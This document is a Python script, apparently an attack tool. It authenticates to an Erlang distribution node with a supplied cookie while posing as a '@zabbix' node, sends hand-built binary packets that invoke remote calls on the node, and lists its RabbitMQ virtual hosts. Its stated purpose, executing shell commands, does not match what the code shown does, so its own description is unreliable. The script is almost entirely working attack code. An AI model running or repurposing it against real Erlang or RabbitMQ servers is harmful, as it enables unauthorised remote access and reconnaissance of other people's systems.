from struct import pack, unpack
from socket import socket, AF_INET, SOCK_STREAM
from hashlib import md5
from binascii import unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse

parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
args = parser.parse_args()


def rand_id(n=12):
    return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@zabbix'


def send_name(name):
    return pack('!HcHI', 7 + len(name), b'n', 5, 0x00077ffc) + name.encode('ascii')


def send_challenge_reply(cookie, challenge):
    m = md5()
    m.update(cookie.encode('ascii'))
    m.update(challenge.encode('ascii'))
    response = m.digest()
    return pack('!HcI', len(response)+5, b'r', args.challenge) + response


def parse_vhost_recv(s):
    s.recv(6)
    atom_caches = s.recv(1)
    if atom_caches == b'\x08':
        gap = 32
    else:
        gap = 16
    s.recv(1)
    while True:
        chunk = s.recv(4)
        if len(chunk) != 4:
            return
        if chunk == b'\x6c\x00\x00\x00':
            break
    s.recv(11)
    while True:
        length = s.recv(4)
        if len(length) != 4:
            return
        (length,) = unpack('!I', length)
        vhost = s.recv(length)
        if len(vhost) != length:
            return
        yield vhost.decode('ascii')
        step = s.recv(gap + 1)
        if len(step) != gap + 1:
            return


name = rand_id()
sock = socket(AF_INET, SOCK_STREAM, 0)
assert sock
sock.connect((args.target, args.port))

sock.sendall(send_name(name))
data = sock.recv(5)
assert(data == b'\x00\x03\x73\x6f\x6b')
data = sock.recv(4096)
(length, tag, version, flags, challenge) = unpack('!HcHII', data[:13])
challenge = '%u' % challenge
sock.sendall(send_challenge_reply(args.cookie, challenge))
data = sock.recv(3)
if len(data) == 0:
    print('wrong cookie, auth unsuccessful')
    sys.exit(1)
else:
    assert (data == b'\x00\x11\x61')
    digest = sock.recv(16)
    assert (len(digest) == 16)
print('[*] authenticated')

data = b'\x83\x44\x02\x9e\x00\x0b' + \
       unhexlify("{:02x}".format(len(name.encode('ascii')))) + \
       name.encode('ascii') + \
       b'\x3c\x03\x72\x65\x78\x68\x04\x61' \
       b'\x13\x67\x52\x00\x00\x00\x00\x4c' \
       b'\x00\x00\x00\x00\x01\x52\x01\x72' \
       b'\x00\x03\x52\x00\x01\x00\x01\x93' \
       b'\xd5\x75\x40\x00\x07\x74\xc3\xc7\xc4'
monitor_p = pack('!I', len(data)) + data

reg_send_ticktime = b'\x00\x00\x00\x87\x83\x44\x07\x86' \
                    b'\xb1\x98\x08\x0b\x05\x00\x3c\x0c' \
                    b'\x09\x24\x67\x65\x6e\x5f\x63\x61' \
                    b'\x6c\x6c\x0a\x04\x63\x61\x6c\x6c' \
                    b'\x94\x0a\x6e\x65\x74\x5f\x6b\x65' \
                    b'\x72\x6e\x65\x6c\x8f\x10\x67\x65' \
                    b'\x74\x5f\x6e\x65\x74\x5f\x74\x69' \
                    b'\x63\x6b\x74\x69\x6d\x65\x68\x04' \
                    b'\x61\x06\x67\x52\x00\x00\x00\x00' \
                    b'\x4c\x00\x00\x00\x00\x03\x52\x01' \
                    b'\x52\x02\x68\x03\x52\x03\x68\x02' \
                    b'\x67\x52\x00\x00\x00\x00\x4c\x00' \
                    b'\x00\x00\x00\x03\x72\x00\x03\x52' \
                    b'\x00\x03\x00\x00\xcc\xe5\xe6\xa4' \
                    b'\x00\x01\x32\x87\x0c\xe8\x68\x05' \
                    b'\x52\x04\x52\x05\x52\x06\x6a\x67' \
                    b'\x52\x00\x00\x00\x00\x34\x00\x00' \
                    b'\x00\x00\x03'

demonitor_p1 = b'\x00\x00\x00\x2b\x83\x44\x02\x16' \
               b'\x00\x0b\x3c\x68\x04\x61\x14\x67' \
               b'\x52\x00\x00\x00\x00\x4c\x00\x00' \
               b'\x00\x00\x03\x52\x01\x72\x00\x03' \
               b'\x52\x00\x03\x00\x00\xcc\xe5\xe6' \
               b'\xa4\x00\x01\x32\x87\x0c\xe8'

reg_send_rabbit_vhosts = b'\x00\x00\x00\x2b\x83\x44\x02\x16' \
                         b'\x00\x0b\x3c\x68\x04\x61\x13\x67' \
                         b'\x52\x00\x00\x00\x00\x4c\x00\x00' \
                         b'\x00\x00\x03\x52\x01\x72\x00\x03' \
                         b'\x52\x00\x03\x00\x00\xcc\xe7\xe6' \
                         b'\xa4\x00\x01\x32\x87\x0c\xe8\x00' \
                         b'\x00\x00\x71\x83\x44\x07\x06\x31' \
                         b'\xa0\x0b\x0b\x05\x3c\x0c\x0a\xd7' \
                         b'\x0c\x72\x61\x62\x62\x69\x74\x5f' \
                         b'\x76\x68\x6f\x73\x74\x6b\x08\x69' \
                         b'\x6e\x66\x6f\x5f\x61\x6c\x6c\x68' \
                         b'\x04\x61\x06\x67\x52\x00\x00\x00' \
                         b'\x00\x4c\x00\x00\x00\x00\x03\x52' \
                         b'\x01\x52\x02\x68\x03\x52\x03\x68' \
                         b'\x02\x67\x52\x00\x00\x00\x00\x4c' \
                         b'\x00\x00\x00\x00\x03\x72\x00\x03' \
                         b'\x52\x00\x03\x00\x00\xcc\xe7\xe6' \
                         b'\xa4\x00\x01\x32\x87\x0c\xe8\x68' \
                         b'\x05\x52\x04\x52\x05\x52\x06\x6a' \
                         b'\x67\x52\x00\x00\x00\x00\x34\x00' \
                         b'\x00\x00\x00\x03'

sock.sendall(monitor_p)
sock.sendall(reg_send_ticktime)
sock.recv(4096)
sock.sendall(demonitor_p1)
sock.sendall(reg_send_rabbit_vhosts)
print([x for x in parse_vhost_recv(sock)])

print('[*] disconnecting')
sock.close()
